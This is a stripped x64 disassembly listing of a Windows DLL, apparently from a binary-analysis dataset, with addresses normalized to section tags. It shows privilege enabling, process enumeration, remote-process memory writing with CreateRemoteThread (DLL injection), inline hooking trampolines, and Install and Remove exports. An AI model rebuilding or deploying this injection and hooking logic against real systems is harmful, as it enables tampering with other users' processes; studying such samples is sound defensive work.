mov rcx [ rsp + 0x70 ]
call sub_180003a30
mov rcx [ rsp + 0x40 ]
sub rax rcx
mov rcx [ rsp + 0x70 ]
cmp [ rcx + 0x20 ] rax
ja r-xdata
xor r8d r8d
mov dl 0x1
mov rcx [ rsp + 0x70 ]
call sub_180003600
mov rax [ rsp + 0x70 ]
mov rcx [ rsp + 0x20 ]
mov [ rax + 0x8 ] rcx
mov rax [ rsp + 0x70 ]
mov rcx [ rsp + 0x28 ]
mov [ rax + 0x20 ] rcx
mov rdx [ rsp + 0x80 ]
mov rcx [ rsp + 0x70 ]
call sub_180003860
add rsp 0x68
retn
mov rcx [ rsp + 0x70 ]
call sub_1800039b0
mov rcx [ rsp + 0x28 ]
add rcx 0x1
mov r9 [ rsp + 0x80 ]
mov r8 rax
mov rdx rcx
mov rcx [ rsp + 0x20 ]
call sub_180003d40
xor edx edx
mov rax [ rsp + 0x70 ]
mov rax [ rax + 0x20 ]
mov ecx 0x2
div rcx
mov rcx [ rsp + 0x70 ]
add rax [ rcx + 0x20 ]
mov [ rsp + 0x28 ] rax
sub_180003c00
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rbp + 0x78 ]
mov [ rbp + 0x28 ] rax
mov rax [ rbp + 0x28 ]
add rax 0x1
mov rdx rax
mov rcx [ rbp + 0x70 ]
call sub_180003ce0
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0x50 ]
mov [ rbp + 0x20 ] rax
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180003c50
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
xor r8d r8d
mov dl 0x1
mov rcx [ rbp + 0x70 ]
call sub_180003600
xor edx edx
xor ecx ecx
call sub_180007410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_180003c90
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
call sub_1800039b0
cmp [ rsp + 0x38 ] rax
jb r-xdata
xor al al
jmp r-xdata
mov rcx [ rsp + 0x30 ]
call sub_1800039b0
mov rcx [ rsp + 0x30 ]
add rax [ rcx + 0x18 ]
cmp rax [ rsp + 0x38 ]
ja r-xdata
add rsp 0x28
retn
mov al 0x1
sub_180003d40
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
call sub_180003160
mov [ rsp + 0x30 ] al
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] al
mov r9 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
mov rdx [ rsp + 0x58 ]
mov rcx [ rsp + 0x50 ]
call sub_180003d90
add rsp 0x48
retn
sub_180003dd0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r9 [ rsp + 0x48 ]
mov r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_1800078c0
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_180003e10
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
call sub_180003160
mov [ rsp + 0x30 ] al
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] al
mov r9 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
mov rdx [ rsp + 0x58 ]
mov rcx [ rsp + 0x50 ]
call sub_180003e60
add rsp 0x48
retn
sub_180003ea0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r9 [ rsp + 0x48 ]
mov r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180003ee0
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_180003ee0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rax [ rsp + 0x48 ]
shl rax 0x1
mov rcx [ rsp + 0x38 ]
shl rcx 0x1
mov r9 rax
mov r8 [ rsp + 0x40 ]
mov rdx rcx
mov rcx [ rsp + 0x30 ]
call sub_1800078c0
add rsp 0x28
retn
sub_180003f30
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
call sub_180003160
mov [ rsp + 0x30 ] al
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] al
mov r9 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
mov rdx [ rsp + 0x58 ]
mov rcx [ rsp + 0x50 ]
call sub_180003f80
add rsp 0x48
retn
sub_180003fc0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r9 [ rsp + 0x48 ]
mov r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180007830
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_180004000
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
cmp [ rsp + 0x50 ] 0x0
ja r-xdata
xor edx edx
mov rax 0xffffffffffffffff
div [ rsp + 0x50 ]
cmp rax 0x1
jae r-xdata
mov [ rsp + 0x50 ] 0x0
jmp r-xdata
mov rcx [ rsp + 0x50 ]
call sub_1800074e0
add rsp 0x48
retn
xor edx edx
lea rcx [ rsp + 0x20 ]
call sub_1800032f0
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
call sub_180007410
sub_1800040b0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
nop
nop
nop
nop
nop
mov rcx rsi
call sub_180004f50
nop
nop
nop
nop
nop
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
lea r9 [ rsp + 0x50 ]
mov edx 0x6
mov r8d 0x1bbc
jmp [ rw-data ]
sub_180004190
mov [ rsp + 0x8 ] ecx
sub rsp 0x28
cmp [ rsp + 0x30 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea r9 [ sub_180004160 ]
lea r8 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_1800013d0
test eax eax
je r-xdata
xor eax eax
lea rcx [ rw-data ]
call sub_180001190
mov [ rw-data ] 0x0
mov eax 0x1
jmp r-xdata
jmp r-xdata
mov rax [ rw-data ]
mov [ rw-data ] rax
mov eax 0x1
jmp r-xdata
add rsp 0x28
retn
sub_180004210
mov [ rsp + 0x8 ] rcx
sub rsp 0x68
mov [ rsp + 0x58 ] 0xfffffffffffffffe
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x30 ]
mov edx 0x28
mov rcx rax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
lea r8 [ rsp + 0x38 ]
mov rdx [ rsp + 0x70 ]
xor ecx ecx
call [ LookupPrivilegeValueW@IAT ]
test eax eax
je r-xdata
add rsp 0x68
retn
mov [ rsp + 0x40 ] 0x1
mov [ rsp + 0x4c ] 0x2
mov rax [ rsp + 0x38 ]
mov [ rsp + 0x44 ] rax
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x0
mov r9d 0x10
lea r8 [ rsp + 0x40 ]
xor edx edx
mov rcx [ rsp + 0x30 ]
call [ AdjustTokenPrivileges@IAT ]
sub_1800042f0
mov [ rsp + 0x8 ] rcx
sub rsp 0x288
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x278 ] rax
mov [ rsp + 0x30 ] 0x238
xor edx edx
mov ecx 0x2
call CreateToolhelp32Snapshot
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0x20 ] 0xffffffffffffffff
je r-xdata
xor eax eax
lea rdx [ rsp + 0x30 ]
mov rcx [ rsp + 0x20 ]
call Process32FirstW
mov [ rsp + 0x270 ] eax
mov rcx [ rsp + 0x20 ]
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
mov rdx [ rsp + 0x290 ]
lea rcx [ rsp + 0x5c ]
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0x278 ]
xor rcx rsp
call sub_180006970
add rsp 0x288
retn
lea rdx [ rsp + 0x30 ]
mov rcx [ rsp + 0x20 ]
call Process32NextW
mov [ rsp + 0x270 ] eax
jmp r-xdata
mov eax [ rsp + 0x38 ]
jmp r-xdata
cmp [ rsp + 0x270 ] 0x0
je r-xdata
sub_1800043c0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] ecx
push rdi
sub rsp 0x490
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x480 ] rax
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x40 ] 0x0
lea rax [ rsp + 0x44 ]
mov rdi rax
xor eax eax
mov ecx 0x434
[ rdi ]
mov [ rsp + 0x20 ] 0x0
mov edx [ rsp + 0x4a0 ]
mov ecx 0x8
call CreateToolhelp32Snapshot
mov [ rsp + 0x28 ] rax
cmp [ rsp + 0x28 ] 0xffffffffffffffff
jne r-xdata
mov [ rsp + 0x40 ] 0x438
lea rdx [ rsp + 0x40 ]
mov rcx [ rsp + 0x28 ]
call Module32FirstW
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov rcx [ rsp + 0x28 ]
call [ CloseHandle@IAT ]
mov rax [ rsp + 0x20 ]
mov rdx [ rsp + 0x4a8 ]
lea rcx [ rsp + 0x70 ]
call sub_180007c40
test eax eax
jne r-xdata
mov rcx [ rsp + 0x480 ]
xor rcx rsp
call sub_180006970
add rsp 0x490
pop rdi
retn
lea rdx [ rsp + 0x40 ]
mov rcx [ rsp + 0x28 ]
call Module32NextW
test eax eax
jne r-xdata
mov rax [ rsp + 0x58 ]
mov [ rsp + 0x20 ] rax
jmp r-xdata
sub_1800044b0
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
sub rsp 0x78
mov [ rsp + 0x40 ] 0x0
lea rcx [ r--data ]
call sub_180004210
mov r8d [ rsp + 0x88 ]
xor edx edx
mov ecx 0x1f0fff
call [ OpenProcess@IAT ]
mov [ rsp + 0x48 ] rax
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov eax [ rsp + 0x40 ]
add rsp 0x78
retn
mov rcx [ rsp + 0x80 ]
call [ lstrlenA@IAT ]
add eax 0x1
cdqe
mov [ rsp + 0x20 ] 0x4
mov r9d 0x1000
mov r8 rax
xor edx edx
mov rcx [ rsp + 0x48 ]
call [ VirtualAllocEx@IAT ]
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rcx [ rsp + 0x80 ]
call [ lstrlenA@IAT ]
add eax 0x1
cdqe
mov [ rsp + 0x20 ] 0x0
mov r9 rax
mov r8 [ rsp + 0x80 ]
mov rdx [ rsp + 0x50 ]
mov rcx [ rsp + 0x48 ]
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov [ rsp + 0x58 ] rax
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov ecx 0x1
call sub_180004190
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] 0x0
mov rax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x58 ]
xor r8d r8d
xor edx edx
mov rcx [ rsp + 0x48 ]
call [ CreateRemoteThread@IAT ]
mov [ rsp + 0x60 ] rax
cmp [ rsp + 0x60 ] 0x0
je r-xdata
cmp [ rsp + 0x60 ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov r9d 0x8000
xor r8d r8d
mov rdx [ rsp + 0x50 ]
mov rcx [ rsp + 0x48 ]
call [ VirtualFreeEx@IAT ]
xor ecx ecx
call sub_180004190
mov edx 0xffffffff
mov rcx [ rsp + 0x60 ]
call [ WaitForSingleObject@IAT ]
mov rcx [ rsp + 0x60 ]
call [ CloseHandle@IAT ]
sub_180004650
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
sub rsp 0x78
mov [ rsp + 0x50 ] 0x0
lea rcx [ r--data ]
call sub_180004210
mov r8d [ rsp + 0x88 ]
xor edx edx
mov ecx 0x1f0fff
call [ OpenProcess@IAT ]
mov [ rsp + 0x48 ] rax
cmp [ rsp + 0x48 ] 0x0
jne r-xdata
mov rdx [ rsp + 0x80 ]
mov ecx [ rsp + 0x88 ]
call sub_1800043c0
mov [ rsp + 0x60 ] rax
cmp [ rsp + 0x60 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov [ rsp + 0x58 ] rax
mov ecx 0x1
call sub_180004190
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] 0x0
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x58 ]
xor r8d r8d
xor edx edx
mov rcx [ rsp + 0x48 ]
call [ CreateRemoteThread@IAT ]
mov [ rsp + 0x40 ] rax
xor ecx ecx
call sub_180004190
cmp [ rsp + 0x40 ] 0x0
je r-xdata
mov rcx [ rsp + 0x48 ]
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
add rsp 0x78
retn
mov rcx [ rsp + 0x48 ]
call [ CloseHandle@IAT ]
mov eax [ rsp + 0x50 ]
mov [ rsp + 0x50 ] 0x1
mov edx 0xffffffff
mov rcx [ rsp + 0x40 ]
call [ WaitForSingleObject@IAT ]
mov rcx [ rsp + 0x40 ]
call [ CloseHandle@IAT ]
sub_180004780
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov rax [ rsp + 0x30 ]
mov [ rax ] 0x0
add rsp 0x18
retn
mov rax [ rsp + 0x20 ]
mov [ rsp + 0x8 ] rax
mov rax [ rsp + 0x28 ]
mov [ rsp ] rax
mov rax [ rsp + 0x20 ]
movzx eax [ rax ]
mov rcx [ rsp + 0x28 ]
movzx ecx [ rcx ]
cmp eax ecx
jne r-xdata
mov rax [ rsp + 0x30 ]
mov rcx [ rsp + 0x20 ]
movzx ecx [ rcx ]
mov [ rax ] cx
mov rax [ rsp + 0x30 ]
add rax 0x2
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x20 ]
add rax 0x2
mov [ rsp + 0x20 ] rax
jmp r-xdata
mov rax [ rsp + 0x8 ]
movzx eax [ rax ]
test eax eax
je r-xdata
mov rax [ rsp + 0x20 ]
movzx eax [ rax ]
test eax eax
je r-xdata
mov rax [ rsp ]
movzx eax [ rax ]
test eax eax
jne r-xdata
mov rax [ rsp ]
movzx eax [ rax ]
test eax eax
je r-xdata
mov rax [ rsp + 0x8 ]
mov [ rsp + 0x20 ] rax
jmp r-xdata
mov rax [ rsp + 0x8 ]
movzx eax [ rax ]
mov rcx [ rsp ]
movzx ecx [ rcx ]
cmp eax ecx
jne r-xdata
mov rax [ rsp + 0x8 ]
add rax 0x2
mov [ rsp + 0x8 ] rax
mov rax [ rsp ]
add rax 0x2
mov [ rsp ] rax
jmp r-xdata
sub_180004870
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
jmp r-xdata
mov rax [ rsp + 0x30 ]
movsx eax [ rax ]
test eax eax
je r-xdata
mov rax [ rsp + 0x30 ]
movsx eax [ rax ]
test eax eax
jne r-xdata
mov rax [ rsp + 0x30 ]
movsx eax [ rax ]
cmp eax 0x78
jne r-xdata
mov [ rsp ] 0x0
mov [ rsp ] 0x1
jmp r-xdata
jmp r-xdata
mov rax [ rsp + 0x20 ]
movzx eax [ rax ]
mov rcx [ rsp + 0x28 ]
movzx ecx [ rcx ]
cmp eax ecx
je r-xdata
mov al [ rsp ]
mov rax [ rsp + 0x30 ]
add rax 0x1
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x20 ]
add rax 0x1
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x28 ]
add rax 0x1
mov [ rsp + 0x28 ] rax
xor al al
jmp r-xdata
add rsp 0x18
retn
sub_180004910
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov [ rsp + 0x20 ] 0x0
jmp r-xdata
mov rax [ rsp + 0x48 ]
cmp [ rsp + 0x20 ] rax
jae r-xdata
xor eax eax
mov rax [ rsp + 0x20 ]
mov rcx [ rsp + 0x40 ]
add rcx rax
mov rax rcx
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x50 ]
mov rcx rax
call sub_180004870
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
mov rax [ rsp + 0x20 ]
mov rcx [ rsp + 0x40 ]
add rcx rax
mov rax rcx
jmp r-xdata
mov rax [ rsp + 0x20 ]
add rax 0x1
mov [ rsp + 0x20 ] rax
add rsp 0x38
retn
sub_1800049a0
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
cmp [ rsp + 0x20 ] 0x0
je r-xdata
xor eax eax
mov rax [ rsp + 0x20 ]
mov [ rsp + 0x8 ] rax
mov rax [ rsp + 0x8 ]
movsxd rax [ rax + 0x3c ]
mov rcx [ rsp + 0x20 ]
add rcx rax
mov rax rcx
mov [ rsp ] rax
mov rax [ rsp ]
mov eax [ rax + 0x1c ]
jmp r-xdata
add rsp 0x18
retn
sub_1800049f0
sub rsp 0x48
xor ecx ecx
call [ GetModuleHandleW@IAT ]
mov [ rsp + 0x30 ] rax
mov rcx [ rsp + 0x30 ]
call sub_1800049a0
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x0
lea r9 [ r--data ]
lea r8 [ r--data ]
mov rdx [ rsp + 0x28 ]
mov rcx [ rsp + 0x30 ]
call sub_180004910
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0x20 ] 0x0
jne r-xdata
mov rax [ rsp + 0x20 ]
movzx eax [ rax + 0x5e ]
cmp eax 0xe8
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x20 ]
movzx eax [ rax + 0x6f ]
cmp eax 0x4c
jne r-xdata
add rsp 0x48
retn
mov rax [ rsp + 0x20 ]
add rax 0x6f
mov [ rw-data ] rax
jmp r-xdata
lea r9 [ r--data ]
lea r8 [ r--data ]
mov rdx [ rsp + 0x28 ]
mov rcx [ rsp + 0x30 ]
call sub_180004910
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0x20 ] 0x0
jne r-xdata
mov rax [ rsp + 0x20 ]
movzx eax [ rax + 0x2b ]
cmp eax 0xe9
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x20 ]
movzx eax [ rax + 0x30 ]
cmp eax 0x48
jne r-xdata
mov rax [ rsp + 0x20 ]
add rax 0x30
mov [ rw-data ] rax
jmp r-xdata
mov eax 0x1
sub_180004af0
sub rsp 0x28
mov rax [ rw-data ]
add rax 0x10
mov [ rw-data ] rax
mov rax [ rw-data ]
add rax 0x12
mov [ rw-data ] rax
lea r8 [ sub_1800040b0 ]
mov rdx [ rw-data ]
lea rcx [ rw-data ]
call sub_180001250
lea r8 [ r-xdata ]
mov rdx [ rw-data ]
lea rcx [ rw-data ]
call sub_180001250
mov eax 0x1
add rsp 0x28
retn
sub_180004be0
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
mov [ rsp + 0x20 ] 0x0
mov dx 0x5c
lea rcx [ rw-data ]
call sub_180005380
add rax 0x2
mov [ rsp + 0x20 ] rax
mov eax 0x1
add rsp 0x48
retn
mov [ rsp + 0x28 ] 0x0
lea rcx [ r--data ]
call sub_1800042f0
mov [ rsp + 0x28 ] eax
cmp [ rsp + 0x28 ] 0x0
je r-xdata
mov ecx 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
mov rdx [ rsp + 0x20 ]
mov ecx [ rsp + 0x28 ]
call sub_1800043c0
mov [ rsp + 0x30 ] rax
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
xor eax eax
cmp eax 0x1
je r-xdata
mov edx [ rsp + 0x28 ]
lea rcx [ rw-data ]
call sub_1800044b0
sub_180004c80
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
mov [ rsp + 0x30 ] 0x0
mov eax [ rsp + 0x58 ]
mov [ rsp + 0x3c ] eax
cmp [ rsp + 0x3c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rsp + 0x3c ] 0x1
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_180004b60
mov r8d 0x104
lea rdx [ rw-data ]
mov rcx [ rsp + 0x50 ]
call [ GetModuleFileNameW@IAT ]
mov r8d 0x104
lea rdx [ rw-data ]
mov rcx [ rsp + 0x50 ]
call [ GetModuleFileNameA@IAT ]
mov r8d 0x104
lea rdx [ rw-data ]
xor ecx ecx
call [ GetModuleFileNameA@IAT ]
mov edx 0x5c
lea rcx [ rw-data ]
call sub_1800053b0
add rax 0x1
mov [ rsp + 0x30 ] rax
lea rdx [ r--data ]
mov rcx [ rsp + 0x30 ]
call sub_180007f00
test eax eax
jne r-xdata
jmp r-xdata
mov eax 0x1
mov edx 0xffffffff
mov rcx [ rw-data ]
call [ TerminateThread@IAT ]
lea rdx [ r--data ]
mov rcx [ rsp + 0x30 ]
call sub_180007f00
test eax eax
jne r-xdata
mov eax 0x1
jmp r-xdata
lea rax [ rsp + 0x38 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x0
xor r9d r9d
lea r8 [ sub_180004be0 ]
xor edx edx
xor ecx ecx
call [ CreateThread@IAT ]
call sub_1800049f0
test eax eax
je r-xdata
add rsp 0x48
retn
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_180005420
call sub_180004af0
mov [ rw-data ] eax
jmp r-xdata
sub_180004de0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov rax [ rsp + 0x20 ]
movzx eax [ rax ]
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov rax [ rsp + 0x20 ]
movzx eax [ rax + 0x1 ]
test eax eax
jne r-xdata
add rsp 0x18
retn
mov rax [ rsp + 0x20 ]
add rax 0x2
mov [ rsp + 0x20 ] rax
jmp r-xdata
mov [ rsp ] 0x0
jmp r-xdata
mov rax [ rsp + 0x30 ]
cmp [ rsp ] rax
jae r-xdata
mov rax [ rsp + 0x20 ]
add rax 0x1
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x20 ]
movzx eax [ rax ]
test eax eax
jne r-xdata
mov rax [ rsp + 0x20 ]
movzx eax [ rax ]
mov rcx [ rsp + 0x28 ]
movzx ecx [ rcx ]
cmp eax ecx
je r-xdata
mov [ rsp + 0x8 ] 0x0
mov [ rsp + 0x8 ] 0x1
jmp r-xdata
jmp r-xdata
xor al al
jmp r-xdata
mov al [ rsp + 0x8 ]
mov rax [ rsp + 0x20 ]
add rax 0x1
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x28 ]
add rax 0x1
mov [ rsp + 0x28 ] rax
mov rax [ rsp ]
add rax 0x1
mov [ rsp ] rax
sub_180004ec0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov [ rsp + 0x20 ] 0x0
jmp r-xdata
mov rax [ rsp + 0x48 ]
cmp [ rsp + 0x20 ] rax
jae r-xdata
xor eax eax
mov rax [ rsp + 0x20 ]
mov rcx [ rsp + 0x40 ]
add rcx rax
mov rax rcx
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x50 ]
mov rcx rax
call sub_180004de0
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
mov rax [ rsp + 0x20 ]
mov rcx [ rsp + 0x40 ]
add rcx rax
mov rax rcx
jmp r-xdata
mov rax [ rsp + 0x20 ]
add rax 0x1
mov [ rsp + 0x20 ] rax
add rsp 0x38
retn
sub_180004f50
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x2a0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x290 ] rax
mov rcx [ rsp + 0x2b0 ]
call sub_180007810
test rax rax
jbe r-xdata
xor eax eax
mov rcx [ rsp + 0x290 ]
xor rcx rsp
call sub_180006970
add rsp 0x2a0
pop rdi
retn
mov rcx [ rsp + 0x2b0 ]
call sub_180007810
cmp rax 0x40
jae r-xdata
mov [ rsp + 0x30 ] 0x0
lea rax [ rsp + 0x32 ]
mov rdi rax
xor eax eax
mov ecx 0x1fe
[ rdi ]
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov rdx [ rsp + 0x2b0 ]
lea rcx [ rsp + 0x30 ]
call sub_180005450
mov r8 [ rsp + 0x20 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_180004780
mov r8 [ rsp + 0x20 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_180004780
cmp [ rsp + 0x20 ] 0x0
je r-xdata
mov [ rsp + 0x238 ] 0x0
mov [ rsp + 0x230 ] 0x0
lea rdx [ rsp + 0x230 ]
mov rcx [ rsp + 0x20 ]
call [ CommandLineToArgvW@IAT ]
mov [ rsp + 0x238 ] rax
cmp [ rsp + 0x238 ] 0x0
je r-xdata
mov rcx [ rsp + 0x238 ]
call [ LocalFree@IAT ]
cmp [ rsp + 0x230 ] 0x3
jne r-xdata
cmp [ rsp + 0x230 ] 0x2
jne r-xdata
lea rcx [ rw-data ]
call sub_180002840
mov rdx rax
mov rax [ rsp + 0x238 ]
mov rcx [ rax ]
call sub_180007c40
test eax eax
jne r-xdata
lea rdx [ r--data ]
mov rax [ rsp + 0x238 ]
mov rcx [ rax ]
call sub_180007c40
test eax eax
jne r-xdata
jmp r-xdata
mov rax [ rsp + 0x238 ]
mov rdx [ rax + 0x8 ]
lea rcx [ rsp + 0x240 ]
call sub_180002740
lea rcx [ rsp + 0x268 ]
call sub_1800053d0
lea rdx [ rsp + 0x268 ]
lea rcx [ rsp + 0x240 ]
call sub_1800020e0
lea rcx [ rsp + 0x268 ]
call sub_180002840
mov rdx rax
lea rcx [ rw-data ]
call sub_180005480
mov rax [ rsp + 0x238 ]
mov rcx [ rax + 0x10 ]
call sub_180007fd0
cdqe
mov [ rw-data ] rax
cmp [ rw-data ] 0x0
jbe r-xdata
mov rax [ rsp + 0x238 ]
mov rdx [ rax + 0x8 ]
lea rcx [ rw-data ]
call sub_180005420
lea rcx [ rsp + 0x268 ]
call sub_1800027f0
lea rcx [ rsp + 0x240 ]
call sub_1800027f0
mov [ rw-data ] 0x1
sub_180005190
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
cmp [ rsp + 0x30 ] 0x0
je r-xdata
xor eax eax
add rsp 0x28
retn
cmp [ rw-data ] 0x0
je r-xdata
lea rcx [ rw-data ]
call sub_180007810
shl rax 0x1
mov rcx [ rsp + 0x30 ]
sub rcx 0x128
mov r9 rax
lea r8 [ rw-data ]
mov edx 0x128
call sub_180004ec0
test rax rax
je r-xdata
mov rax [ rsp + 0x30 ]
mov rcx [ rw-data ]
mov [ rax ] rcx
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
sub_180005210
sub rsp 0x38
mov [ rsp + 0x20 ] 0xffffffff
lea rdx [ r--data ]
lea rcx [ r--data ]
call [ FindWindowW@IAT ]
mov [ rsp + 0x28 ] rax
cmp [ rsp + 0x28 ] 0x0
je r-xdata
mov eax [ rsp + 0x20 ]
add rsp 0x38
retn
lea rdx [ rsp + 0x20 ]
mov rcx [ rsp + 0x28 ]
call [ GetWindowThreadProcessId@IAT ]
Install
sub rsp 0x38
mov [ rsp + 0x20 ] 0x0
lea rcx [ r--data ]
call sub_1800042f0
mov [ rsp + 0x20 ] eax
cmp [ rsp + 0x20 ] 0x0
je r-xdata
mov eax 0x1
add rsp 0x38
retn
mov edx [ rsp + 0x20 ]
lea rcx [ rw-data ]
call sub_1800044b0
Remove
sub rsp 0x38
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x0
lea rcx [ r--data ]
call sub_1800042f0
mov [ rsp + 0x20 ] eax
cmp [ rsp + 0x20 ] 0x0
je r-xdata
mov eax 0x1
add rsp 0x38
retn
mov dx 0x5c
lea rcx [ rw-data ]
call sub_180005380
add rax 0x2
mov [ rsp + 0x28 ] rax
mov edx [ rsp + 0x20 ]
mov rcx [ rsp + 0x28 ]
call sub_180004650
sub_1800053d0
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
lea rax [ rsp + 0x20 ]
mov [ rsp + 0x28 ] rax
